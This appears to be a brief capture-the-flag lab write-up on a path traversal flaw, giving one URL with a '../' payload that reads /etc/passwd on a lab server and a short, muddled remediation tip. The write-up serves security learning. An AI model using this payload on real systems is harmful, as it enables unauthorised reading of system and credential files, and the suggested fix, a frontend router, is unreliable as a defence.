# 08_Path_traversal

Able to read arbitrary files on the server running the application.  
This might include application code and data, credentials for back-end systems, and sensitive operating system files. In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.

## Method & Manipulation

Go to http://192.168.1.59/?page=../../../../../../../etc/passwd  
And voila! a flag

## Resolve

- The Robots.txt file can be read by anyone be sure the folders listed within
 have restricted access. You can do this by using a router on the frontend. This
 is also done to ensure users do not have access to the servers files using ../
 
## Resources

https://portswigger.net/web-security/file-path-traversal
